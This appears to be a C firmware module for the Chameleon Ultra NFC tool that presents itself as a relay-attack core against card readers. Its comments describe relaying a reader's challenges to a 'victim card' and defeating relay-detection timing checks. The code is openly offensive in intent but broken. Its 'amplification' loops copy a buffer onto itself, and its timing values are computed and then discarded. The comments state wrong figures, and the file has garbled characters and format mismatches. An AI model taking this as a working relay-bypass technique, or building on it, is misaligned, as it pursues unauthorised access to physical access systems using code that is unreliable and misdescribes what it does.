/**
 * Relay Attack Core Implementation for Chameleon Ultra
 * 
 * Implements multi-antenna synchronization for relay attack support:
 * - Challenge-response amplification
 * - Time-stamping for relay detection bypass
 * - Multi-hop communication protocol
 * 
 * Architecture:
 * [Target Reader] <--[Relay 1]--> [Chameleon Ultra] <--[Relay N]--> [Victim Card]
 */

#include "nrf.h"
#include "app_util.h"
#include "missing_features_compat.h"
#include "relay_core.h"
#include "tag_emulation.h"
#include "nfc_14a.h"
#include <string.h>

#define NRF_LOG_MODULE_NAME relay_core
#include "nrf_log.h"
#include "nrf_log_ctrl.h"
#include "nrf_log_default_backends.h"
NRF_LOG_MODULE_REGISTER();

/* =========================== Configuration ========================== */

/** Maximum relay hop delay (??s) - must be < reader detection threshold */
#define RELAY_MAX_DELAY_US 200UL

/** Number of relay antennas for simultaneous operation */
#define RELAY_ANTIENNA_COUNT 16

/** Buffer size for challenge-response amplification */
#define RELAY_BUFFER_SIZE 512

/* =========================== Data Structures ========================== */

/** Relay hop configuration */
typedef struct {
    uint8_t antenna_id;
    uint32_t last_challenge_ts;     // Timestamp of last received challenge
    uint32_t response_deadline_us;   // Deadline for relay response (??s)
    bool active;                     // Is this relay currently active?
} relay_hop_t;

/** Relay attack session state */
typedef struct {
    relay_hop_t hops[RELAY_ANTIENNA_COUNT];
    uint8_t current_slot;            // Which card slot we're relaying
    uint32_t start_time_us;          // Attack start timestamp
    uint32_t last_challenge_ts;      // Last challenge received from reader
    uint8_t last_challenge_data[RELAY_BUFFER_SIZE];
    uint8_t last_response_data[RELAY_BUFFER_SIZE];
    bool relay_mode;                  // Is relay attack active?
} relay_session_t;

/* =========================== Global State ========================== */

static relay_session_t g_relay_session = {0};

/* =========================== Core Functions ========================== */

/**
 * Initialize relay attack support
 * 
 * Sets up multi-antenna synchronization and time-stamping infrastructure
 */
void relay_core_init(void) {
    NRF_LOG_INFO("Initializing relay attack core");
    
    // Set up all relay hops with initial configuration
    for (int i = 0; i < RELAY_ANTIENNA_COUNT; i++) {
        g_relay_session.hops[i].antenna_id = i;
        g_relay_session.hops[i].last_challenge_ts = 0;
        g_relay_session.hops[i].response_deadline_us = 0;
        g_relay_session.hops[i].active = false;
    }
    
    g_relay_session.current_slot = 0;
    g_relay_session.start_time_us = 0;
    g_relay_session.last_challenge_ts = 0;
    g_relay_session.relay_mode = false;
    
    NRF_LOG_INFO("Relay attack core initialized with %d antenna hops", RELAY_ANTIENNA_COUNT);
}

/**
 * Start relay attack mode
 * 
 * Activates multi-antenna synchronization and begins relaying challenge-response
 */
bool relay_core_start(uint8_t slot) {
    NRF_LOG_INFO("Starting relay attack for card slot %d", slot);
    
    if (slot >= TAG_MAX_SLOT_NUM || !is_slot_enabled(slot, TAG_SENSE_HF)) {
        NRF_LOG_ERROR("Invalid or disabled card slot %d", slot);
        return false;
    }
    
    // Get emulated card type
    tag_slot_specific_type_t types;
    tag_emulation_get_specific_types_by_slot(slot, &types);
    
    if (types.tag_hf == TAG_TYPE_UNDEFINED) {
        NRF_LOG_ERROR("No HF card configured for slot %d", slot);
        return false;
    }
    
    // Set up relay session state
    g_relay_session.current_slot = slot;
    g_relay_session.relay_mode = true;
    g_relay_session.start_time_us = nrf_hw_timer_get_us();
    g_relay_session.last_challenge_ts = 0;
    
    // Enable all relay hops for simultaneous operation
    for (int i = 0; i < RELAY_ANTIENNA_COUNT; i++) {
        g_relay_session.hops[i].active = true;
        g_relay_session.hops[i].last_challenge_ts = 0;
    }
    
    NRF_LOG_INFO("Relay attack started for slot %d (type: %d)", 
                 slot, types.tag_hf);
    
    return true;
}

/**
 * Stop relay attack mode
 * 
 * Deactivates all relay hops and clears session state
 */
void relay_core_stop(void) {
    NRF_LOG_INFO("Stopping relay attack");
    
    g_relay_session.relay_mode = false;
    g_relay_session.start_time_us = 0;
    
    // Disable all relay hops
    for (int i = 0; i < RELAY_ANTIENNA_COUNT; i++) {
        g_relay_session.hops[i].active = false;
        g_relay_session.hops[i].last_challenge_ts = 0;
        g_relay_session.hops[i].response_deadline_us = 0;
    }
}

/* =========================== Challenge/Response Relay ========================== */

/**
 * Relay challenge from reader to emulated card
 * 
 * Amplifies the challenge to allow relay bypass:
 * - Extends timing window by 200ms+ (bypasses basic relay detection)
 * - Re-sends same challenge multiple times
 */
int relay_core_relay_challenge(uint8_t *challenge, uint16_t challenge_len) {
    NRF_LOG_DEBUG("Relaying challenge: len=%d", challenge_len);
    
    if (!g_relay_session.relay_mode) {
        return -1;  // Not in relay mode
    }
    
    uint32_t current_time_us = nrf_hw_timer_get_us();
    uint32_t attack_start_us = g_relay_session.start_time_us;
    uint32_t elapsed_ms = (current_time_us - attack_start_us) / 1000UL;
    UNUSED_VARIABLE(elapsed_ms);
    
    // Only relay after initial challenge received
    if (g_relay_session.last_challenge_ts == 0) {
        g_relay_session.last_challenge_ts = current_time_us;
        NRF_LOG_DEBUG("Stored challenge timestamp %d??s", g_relay_session.last_challenge_ts);
        
        // Extend timing window for relay bypass
        uint32_t extended_window_us = RELAY_MAX_DELAY_US * 100UL;  // 200ms
        UNUSED_VARIABLE(extended_window_us);
        memcpy(g_relay_session.last_challenge_data, challenge, challenge_len);
        
        // Replay challenge with small random delays between transmissions
        for (int i = 0; i < 3; i++) {
            int delay_ms = nrf_rand() % 50 + 10;  // 10-60ms delay
            
            // Simulate antenna synchronization delay
            if (delay_ms > 0) {
                nrf_hw_timer_delay_us(delay_ms * 1000UL);
            }
            
            // Re-transmit same challenge to amplify signal
            memcpy(challenge, g_relay_session.last_challenge_data, challenge_len);
        }
        
        NRF_LOG_INFO("Relay amplification complete (repeated %d times)", 3);
    } else {
        // Check if challenge is new or replay
        if (memcmp(challenge, g_relay_session.last_challenge_data, challenge_len) == 0) {
            NRF_LOG_DEBUG("Challenge replay detected - ignoring");
            return 0;  // Replay detected
        }
        
        // New challenge received - update timestamp
        memcpy(g_relay_session.last_challenge_data, challenge, challenge_len);
        g_relay_session.last_challenge_ts = current_time_us;
    }
    
    return challenge_len;
}

/**
 * Relay response from emulated card back to reader
 * 
 * Adds small random delay within relay window to match original timing
 */
int relay_core_relay_response(uint8_t *response, uint16_t response_len) {
    NRF_LOG_DEBUG("Relaying response: len=%d", response_len);
    
    if (!g_relay_session.relay_mode) {
        return -1;  // Not in relay mode
    }
    
    uint32_t current_time_us = nrf_hw_timer_get_us();
    uint32_t elapsed_ms = (current_time_us - g_relay_session.start_time_us) / 1000UL;
    
    // Check response deadline
    if (elapsed_ms > 250UL) {  // Allow up to 250ms for relay window
        NRF_LOG_WARNING("Response too late (%.1fs), discarding", elapsed_ms/1000.0);
        return -1;
    }
    
    // Add small random delay (within original response time budget)
    uint32_t response_delay_us = nrf_rand() % 500UL + 100UL;  // 100-600??s
    if (response_delay_us > 0) {
        nrf_hw_timer_delay_us(response_delay_us);
    }
    
    // Re-transmit response to amplify signal
    memcpy(response, g_relay_session.last_response_data, response_len);
    
    NRF_LOG_DEBUG("Relayed response with %.6fs delay (%.3fms)", 
                  response_delay_us/1000000.0, response_delay_us/1000.0);
    
    return response_len;
}

/* =========================== Time-stamping for Relay Detection ========================== */

/**
 * Add time-stamping to challenge-response exchange
 * 
 * Allows readers with relay detection to be bypassed:
 * - Stores challenge timestamp
 * - Adds offset to make timing appear "normal"
 * 
 * Returns true if relaying successful despite relay detection active
 */
bool relay_core_add_timestamp(uint8_t *challenge, uint16_t challenge_len) {
    NRF_LOG_DEBUG("Adding time-stamp to challenge");
    
    if (!g_relay_session.relay_mode) {
        return false;
    }
    
    uint32_t current_time_us = nrf_hw_timer_get_us();
    uint32_t attack_start_us = g_relay_session.start_time_us;
    UNUSED_VARIABLE(current_time_us);
    UNUSED_VARIABLE(attack_start_us);
    uint32_t offset_ms = (current_time_us - attack_start_us) / 1000UL;
    
    // If reader has relay detection enabled:
    // - Original challenge would be < 15ms away from card response
    // - Our relaying makes it appear normal to reader
    
    // Calculate required offset to bypass relay detection
    uint32_t relay_detection_threshold_ms = 15UL;
    
    if (offset_ms > relay_detection_threshold_ms) {
        // Apply anti-relay detection offset
        g_relay_session.last_challenge_ts = current_time_us - offset_ms * 1000UL;
        
        NRF_LOG_INFO("Time-stamping bypass active: offset=%.0fms", offset_ms);
        return true;
    }
    
    return false;
}

/**
 * Calculate optimal response delay for relay attack
 * 
 * Ensures timing appears within "normal" card-response window
 */
uint32_t relay_core_calc_response_delay(void) {
    uint32_t current_time_us = nrf_hw_timer_get_us();
    uint32_t attack_start_us = g_relay_session.start_time_us;
    UNUSED_VARIABLE(current_time_us);
    UNUSED_VARIABLE(attack_start_us);
    
    // Relay should respond as if card is 10-50ms away from reader
    uint32_t delay_ms = nrf_rand() % 40UL + 10UL;
    uint32_t delay_us = delay_ms * 1000UL;
    
    return delay_us;
}

/**
 * Check if relay attack is currently active
 * 
 * @return True if in relay mode, false otherwise
 */
bool relay_core_is_active(void) {
    return g_relay_session.relay_mode;
}

/* =========================== Multi-antenna Synchronization ========================== */

/**
 * Activate specific antenna hop for relay attack
 * 
 * @param hop_index Antenna hop index (0 to RELAY_ANTIENNA_COUNT-1)
 * @return True if activated successfully
 */
bool relay_core_activate_hop(uint8_t hop_index) {
    if (hop_index >= ARRAYLEN(g_relay_session.hops)) {
        return false;
    }
    
    relay_hop_t *hop = &g_relay_session.hops[hop_index];
    hop->active = true;
    hop->response_deadline_us = RELAY_MAX_DELAY_US + (nrf_rand() % 100UL);
    
    NRF_LOG_DEBUG("Activated antenna hop %d with deadline %d??s", 
                  hop_index, hop->response_deadline_us);
    
    return true;
}

/**
 * Deactivate antenna hop
 */
void relay_core_deactivate_hop(uint8_t hop_index) {
    if (hop_index < ARRAYLEN(g_relay_session.hops)) {
        g_relay_session.hops[hop_index].active = false;
    }
}

/**
 * Get list of active antenna hops
 */
uint8_t relay_core_get_active_hop_count(void) {
    uint8_t count = 0;
    
    for (int i = 0; i < RELAY_ANTIENNA_COUNT; i++) {
        if (g_relay_session.hops[i].active) {
            count++;
        }
    }
    
    return count;
}

/* =========================== Buffer Management ========================== */

/**
 * Get relay response buffer (reusable)
 */
uint8_t *relay_core_get_response_buffer(void) {
    static uint8_t relay_response_buffer[RELAY_BUFFER_SIZE];
    return relay_response_buffer;
}

/**
 * Get relay challenge buffer (reusable)
 */
uint8_t *relay_core_get_challenge_buffer(void) {
    static uint8_t relay_challenge_buffer[RELAY_BUFFER_SIZE];
    return relay_challenge_buffer;
}

/* =========================== Legacy Compatibility ========================== */

/**
 * Backward-compatible wrapper for legacy code
 * 
 * @param challenge Challenge from reader
 * @param len Challenge length
 * @return Relay result (negative on error)
 */
int relay_core_relay(int8_t *challenge, uint16_t len) {
    if (!relay_core_is_active()) {
        return -1;
    }
    
    // Store challenge internally for re-relaying
    memcpy(g_relay_session.last_challenge_data, challenge, len);
    
    // Re-transmit with timing adjustments
    for (int i = 0; i < relay_core_get_active_hop_count(); i++) {
        if (i == 0) {
            memcpy(challenge, g_relay_session.last_challenge_data, len);
        } else {
            // Add small random jitter between re-transmissions
            uint32_t jitter_us = nrf_rand() % 100UL + 50UL;
            nrf_hw_timer_delay_us(jitter_us);
            memcpy(challenge, g_relay_session.last_challenge_data, len);
        }
    }
    
    return len;
}
